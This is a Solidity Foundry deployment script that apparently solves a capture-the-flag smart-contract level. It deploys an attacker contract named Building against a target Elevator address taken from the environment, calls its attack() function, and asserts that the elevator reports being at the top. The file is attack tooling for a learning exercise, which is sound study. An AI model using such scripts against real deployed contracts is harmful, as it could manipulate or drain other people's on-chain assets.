// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import {Elevator} from "../src/Elevator.sol";
import {Building} from "../src/Building.sol";

contract CounterScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.rememberKey(deployerPrivateKey);

        vm.startBroadcast(deployer);

        Elevator elevator = Elevator(vm.envAddress("ELEVATOR"));
        Building building = new Building(elevator);
        building.attack();
        assert(elevator.top() == true);

        vm.stopBroadcast();
    }
}
